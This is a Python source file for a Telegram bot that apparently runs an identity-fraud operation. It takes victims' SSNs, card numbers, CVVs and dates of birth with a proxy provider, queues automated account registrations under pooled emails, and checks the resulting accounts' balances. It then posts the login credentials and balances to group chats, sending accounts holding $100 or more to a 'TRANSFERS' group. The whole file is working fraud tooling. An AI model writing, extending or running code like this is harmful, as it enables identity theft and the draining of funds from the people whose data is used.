# bot.py
import json
import os
import re
import string
import secrets
from typing import Any, Dict, Optional, Tuple, Union

from loguru import logger
from telegram import Update, BotCommand
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

from supabase._async.client import AsyncClient as Client
from db.base import get_supabase
from db.emails import EmailsRepo
from db.users import UsersRepo
from db.tasks import TasksRepo

# =========================
# Config -> Environment
# =========================
with open("config.json", "r", encoding="utf-8") as f:
    cfg = json.load(f)
for k, v in cfg.items():
    os.environ[k] = str(v)
    logger.debug(f"Loaded env var: {k}")

# Always post results to MAIN group; if balance >= 100 also to TRANSFERS group
MAIN_GROUP_CHAT_ID = int(os.getenv("MAIN_GROUP_CHAT_ID", "-4823975367"))
TRANSFERS_GROUP_CHAT_ID = int(os.getenv("TRANSFERS_GROUP_CHAT_ID", "-4686276375"))

# =========================
# Parsing helpers
# =========================
def _parse_keyvals_from_message(text: str) -> Dict[str, str]:
    lines = (text or "").splitlines()
    if lines:
        lines = lines[1:]  # drop command line
    data: Dict[str, str] = {}
    for line in lines:
        if not line.strip():
            continue
        if ":" in line:
            k, v = line.split(":", 1)
            key = k.strip()
            val = v.strip().rstrip(",")
            if key == "proxyProvider":
                data["proxyProvider"] = val
            key_norm = re.sub(r"[^a-zA-Z0-9]+", "_", key).strip("_").lower()
            data[key_norm] = val
    return data

def _parse_card_expiry(s: str) -> Tuple[Optional[int], Optional[int]]:
    m = re.match(r"^\s*(\d{2})\s*/\s*(\d{2})\s*$", s or "")
    if not m:
        return None, None
    mm = int(m.group(1))
    yy = 2000 + int(m.group(2))
    return mm, yy

def _parse_dob(s: str) -> Tuple[Optional[int], Optional[int], Optional[int]]:
    m = re.match(r"^\s*(\d{2})\s*/\s*(\d{2})\s*/\s*(\d{4})\s*$", s or "")
    if not m:
        return None, None, None
    return int(m.group(1)), int(m.group(2)), int(m.group(3))

def _normalize_form(raw: Dict[str, str]) -> Dict[str, Any]:
    out: Dict[str, Any] = dict(raw)
    if "card_expiry" in raw:
        em, ey = _parse_card_expiry(raw["card_expiry"])
        out["card_expiry_month"] = em
        out["card_expiry_year"] = ey
    if "dob" in raw:
        dm, dd, dy = _parse_dob(raw["dob"])
        out["dob_month"] = dm
        out["dob_day"] = dd
        out["dob_year"] = dy
    for k in ("ssn", "card_number", "cvv", "zip"):
        if k in raw:
            digits = re.sub(r"\D", "", str(raw[k]))
            out[f"{k}_num"] = int(digits) if digits else None
    if "proxyProvider" in raw and "proxy_provider" not in raw:
        out["proxy_provider"] = raw["proxyProvider"]
    return out

# =========================
# Credential helpers
# =========================
def _make_username_from_email(email: str) -> str:
    return email.split("@", 1)[0]

def _generate_password() -> str:
    """
    8 chars total.
    Must include: >=1 uppercase, >=1 lowercase, >=1 digit, and EXACTLY one special from @#$.
    """
    rng = secrets.SystemRandom()
    specials = "@#$"
    upp = string.ascii_uppercase
    low = string.ascii_lowercase
    dig = string.digits

    chars = [
        rng.choice(upp),
        rng.choice(low),
        rng.choice(dig),
        rng.choice(specials),  # exactly one special; others from letters+digits
    ]
    pool = upp + low + dig
    chars += [rng.choice(pool) for _ in range(8 - len(chars))]
    rng.shuffle(chars)
    return "".join(chars)

# =========================
# Services (use repos)
# =========================
async def queue_balance_task(
    sb: Client,
    email: str,
    *,
    message_id: Optional[str] = None,
) -> Dict[str, Any]:
    emails_repo = EmailsRepo(sb)
    users_repo = UsersRepo(sb)

    email_row = await emails_repo.get_by_email(email)
    if not email_row:
        raise ValueError(f"No email record found for: {email}")

    user_row = await users_repo.get_by_email(email)

    additional_data = {
        "email_record": email_row,
        "user_record": user_row,
    }

    payload = {
        "task_type": "BALANCE_CHECK",
        "status": "PENDING",
        "email": email,
        "message_id": message_id,
        "additional_data": additional_data,
    }

    resp = await sb.table("tasks").insert(payload).execute()
    data = resp.data or []
    return data[0] if isinstance(data, list) and data else data


async def queue_register_static(
    sb: Client,
    form_raw: Dict[str, str],
    *,
    message_id: Optional[str] = None,
) -> Dict[str, Any]:
    emails_repo = EmailsRepo(sb)
    users_repo = UsersRepo(sb)

    email_row = await emails_repo.find_free_email()
    if not email_row:
        raise RuntimeError("No free emails available.")

    selected_email = email_row["email"]

    gen_username = _make_username_from_email(selected_email)
    gen_password = _generate_password()

    # Reserve; roll back on failure
    await emails_repo.set_used(selected_email, True)

    try:
        user_row = await users_repo.get_by_email(selected_email)

        additional_data = {
            "form": _normalize_form(form_raw),
            "email_record": email_row,
            "user_record": user_row,
            "username": gen_username,
            "password": gen_password,
        }

        payload = {
            "task_type": "REGISTER",
            "status": "PENDING",
            "email": selected_email,
            "message_id": message_id,
            "additional_data": additional_data,
        }

        resp = await sb.table("tasks").insert(payload).execute()
        data = resp.data or []
        return data[0] if isinstance(data, list) and data else data
    except Exception:
        await emails_repo.set_used(selected_email, False)
        raise

# =========================
# Output parsing + message building
# =========================
def _parse_balances(output: Any) -> Dict[str, Any]:
    text = "" if output is None else str(output)

    # main balance: "💸 Balance: $123.45" or "Balance: $123"
    main_match = re.search(r"(?:💸\s*)?Balance:\s*\$([\d,]+(?:\.\d{2})?)", text, re.I)
    main_balance = float(main_match.group(1).replace(",", "")) if main_match else 0.0

    # savings: "Savings•••• 1234 $567.89" or "Savings $567.89"
    savings_match = re.search(r"Savings[^$]*\$\s*([\d,]+(?:\.\d{2})?)", text, re.I)
    savings_balance = float(savings_match.group(1).replace(",", "")) if savings_match else 0.0

    bad_status = bool(re.search(r"Bad\s*Status:\s*True", text, re.I))

    return {
        "main_balance": main_balance,
        "savings_balance": savings_balance,
        "bad_status": bad_status,
        "raw": text,
    }

def _build_balance_message(
    *,
    email: str,
    username: Optional[str],
    password: Optional[str],
    master_email: Optional[str],
    profile_id: Optional[str],
    main_balance: Union[float, str],
    savings_balance: Union[float, str],
    raw_output: str,
) -> str:
    parts = [
        f"Email: {email}",
        f"Username: {username}" if username else None,
        f"Password: {password}" if password else None,
        f"Master Email: {master_email}" if master_email else None,
        f"Profile ID: {profile_id}" if profile_id else None,
        f"Main Balance: {main_balance}",  # Just convert to string
        f"Savings Balance: {savings_balance}",  # Just convert to string
    ]
    header = "\n".join(p for p in parts if p)

    tail = ""
    if raw_output:
        trimmed = raw_output if len(raw_output) <= 1800 else raw_output[:1800] + "…"
        tail = f"\n\n--- Raw Output ---\n{trimmed}"

    return header + tail

def _register_successful(output: Any) -> bool:
    text = "" if output is None else str(output)
    return bool(re.search(r"(success|registered\s+success)", text, re.I))

# =========================
# Cron processors (use repos)
# =========================
async def _create_user_from_register_task(sb: Client, task: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    users_repo = UsersRepo(sb)
    ad = task.get("additional_data") or {}
    form = ad.get("form") or {}

    payload = {
        "email": task.get("email"),
        "username": ad.get("username"),
        "password": ad.get("password"),  # consider hashing elsewhere
        "first_name": form.get("first_name") or form.get("first_name"),
        "last_name": form.get("last_name") or form.get("last_name"),
        "ssn": form.get("ssn_num"),
        "card_number": form.get("card_number_num"),
        "card_expiry_month": form.get("card_expiry_month"),
        "card_expiry_year": form.get("card_expiry_year"),
        "cvv": form.get("cvv_num"),
        "dob_month": form.get("dob_month"),
        "dob_day": form.get("dob_day"),
        "dob_year": form.get("dob_year"),
        "phone_number": form.get("phone_number"),
        "banned": False,
        "profile_id": form.get("profile_id"),
    }
    payload = {k: v for k, v in payload.items() if v is not None}

    try:
        user = await users_repo.create(payload)
        return user
    except Exception as e:
        logger.error(f"Failed to create user from REGISTER task: {e}")
        return None

async def _post_to_groups(bot, text: str, *, high_balance: bool) -> None:
    # Always post to main group
    try:
        await bot.send_message(MAIN_GROUP_CHAT_ID, text)
    except Exception as e:
        logger.error(f"Failed to send to MAIN_GROUP_CHAT_ID={MAIN_GROUP_CHAT_ID}: {e}")

    # Post to transfers group only on high balance
    if high_balance:
        try:
            await bot.send_message(TRANSFERS_GROUP_CHAT_ID, text)
        except Exception as e:
            logger.error(f"Failed to send to TRANSFERS_GROUP_CHAT_ID={TRANSFERS_GROUP_CHAT_ID}: {e}")

async def _process_balance_task(sb: Client, bot, task: Dict[str, Any]) -> None:
    emails_repo = EmailsRepo(sb)
    users_repo = UsersRepo(sb)
    tasks_repo = TasksRepo(sb)

    email = task.get("email")
    output = task.get("output") or ""

    email_row = await emails_repo.get_by_email(email)
    user_row = await users_repo.get_by_email(email)

    if not user_row:
        await _post_to_groups(bot, f"❌ User not found for email: {email}", high_balance=False)
        await tasks_repo.delete_by_id(task["id"])
        return

    parsed = _parse_balances(output)
    msg = _build_balance_message(
        email=email,
        username=user_row.get("username"),
        password=user_row.get("password"),
        master_email=(email_row or {}).get("master_email"),
        profile_id=user_row.get("profile_id") or (email_row or {}).get("profile_id"),
        main_balance=parsed["main_balance"],
        savings_balance=parsed["savings_balance"],
        raw_output=parsed["raw"],
    )

    high = parsed["main_balance"] >= 100 or parsed["savings_balance"] >= 100
    await _post_to_groups(bot, msg, high_balance=high)

    if parsed["bad_status"]:
        await emails_repo.set_banned(email, True)

    await tasks_repo.delete_by_id(task["id"])

async def _process_register_task(sb: Client, bot, task: Dict[str, Any]) -> None:
    emails_repo = EmailsRepo(sb)
    users_repo = UsersRepo(sb)
    tasks_repo = TasksRepo(sb)

    email = task.get("email")
    output = task.get("output") or ""
    parsed = _parse_balances(output)

    if _register_successful(output):
        user_row = await users_repo.get_by_email(email)
        if not user_row:
            user_row = await _create_user_from_register_task(sb, task)
        await emails_repo.set_used(email, True)

        email_row = await emails_repo.get_by_email(email)
        msg = _build_balance_message(
            email=email,
            username=(user_row or {}).get("username") or (task.get("additional_data") or {}).get("username"),
            password=(user_row or {}).get("password") or (task.get("additional_data") or {}).get("password"),
            master_email=(email_row or {}).get("master_email"),
            profile_id=(user_row or {}).get("profile_id") or (email_row or {}).get("profile_id"),
            main_balance=parsed["main_balance"],
            savings_balance=parsed["savings_balance"],
            raw_output=parsed["raw"],
        )
        await _post_to_groups(bot, f"✅ Registered\n{msg}", high_balance=(parsed["main_balance"] >= 100 or parsed["savings_balance"] >= 100))

        if parsed["bad_status"]:
            await emails_repo.set_banned(email, True)
    else:
        trimmed = (str(output)[:1800] + "…") if output and len(str(output)) > 1800 else str(output)
        await _post_to_groups(bot, f"❌ Failed to register email: {email}\n{trimmed}", high_balance=False)
        await emails_repo.set_used(email, False)

    await tasks_repo.delete_by_id(task["id"])

# =========================
# Cron job (every minute)
# =========================
async def cron_process_completed_tasks(context: ContextTypes.DEFAULT_TYPE):
    """Runs every minute: fetch COMPLETED tasks and process them."""
    sb: Client = context.application.bot_data["sb"]
    tasks_repo = TasksRepo(sb)
    bot = context.bot

    logger.info(f"Running cron job")
    try:
        tasks = await tasks_repo.list_completed(limit=50)
        if not tasks:
            return

        for task in tasks:
            try:
                ttype = str(task.get("task_type") or "").upper()
                if ttype in ("BALANCE", "BALANCE_CHECK"):
                    await _process_balance_task(sb, bot, task)
                elif ttype == "REGISTER":
                    await _process_register_task(sb, bot, task)
                else:
                    await tasks_repo.delete_by_id(task["id"])
            except Exception as e:
                logger.exception(f"Error processing task id={task.get('id')}: {e}")
                try:
                    await tasks_repo.delete_by_id(task["id"])
                except Exception:
                    pass
    except Exception as e:
        logger.error(f"cron_process_completed_tasks error: {e}")

# =========================
# Telegram Commands
# =========================
async def on_startup(app):
    app.bot_data["sb"] = await get_supabase()
    await app.bot.set_my_commands([
        BotCommand("get_balance", "Create balance_check task for an email"),
        BotCommand("register_static", "Create REGISTER task from a static form"),
        BotCommand("ping", "Get ping")
    ])

    app.job_queue.run_repeating(cron_process_completed_tasks, interval=60, first=10)
    logger.info(
        f"Async Supabase client initialized, commands set, cron scheduled. "
        f"MAIN_GROUP_CHAT_ID={MAIN_GROUP_CHAT_ID}, TRANSFERS_GROUP_CHAT_ID={TRANSFERS_GROUP_CHAT_ID}"
    )

async def get_balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /get_balance {email}")
        return
    email = context.args[0].strip()
    message_id = str(update.message.chat_id) if update.message else None

    sb: Client = context.application.bot_data["sb"]
    try:
        task = await queue_balance_task(sb, email, message_id=message_id)
        await update.message.reply_text(f"✅ Task queued (id: {task['id']}) for {email}.")
    except Exception as e:
        logger.exception(f"/get_balance error for {email}: {e}")
        await update.message.reply_text(f"❌ Failed to queue task for {email}: {e}")

async def register_static_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text if update.message else ""
    form = _parse_keyvals_from_message(text)
    if not form:
        await update.message.reply_text(
            "Usage:\n/register_static\nfirst_name:John\nlast_name:Doe\ndob:01/01/1990\n"
            "street_address:...\ncity:...\nstate:...\nzip:...\nssn:...\ncard_number:...\n"
            "card_expiry:MM/YY\ncvv:...\nproxyProvider:..."
        )
        return

    sb: Client = context.application.bot_data["sb"]
    message_id = str(update.message.chat_id) if update.message else None

    try:
        task = await queue_register_static(sb, form, message_id=message_id)
        await update.message.reply_text(
            f"✅ REGISTER task queued (id: {task['id']}) using {task.get('email')}."
        )
    except RuntimeError as e:
        await update.message.reply_text(f"❌ {e}")
    except Exception as e:
        logger.exception(f"/register_static error: {e}")
        await update.message.reply_text("❌ Failed to queue REGISTER task.")

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Pong")

# =========================
# Entry point
# =========================
def main():
    token = os.getenv("TELEGRAM_BOT_TOKEN")
    if not token:
        raise RuntimeError("Missing TELEGRAM_BOT_TOKEN in environment")

    app = (
        ApplicationBuilder()
        .token(token)
        .post_init(on_startup)   # async init hook
        .build()
    )

    app.add_handler(CommandHandler("get_balance", get_balance_cmd))
    app.add_handler(CommandHandler("register_static", register_static_cmd))
    app.add_handler(CommandHandler("ping", ping))

    logger.info("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
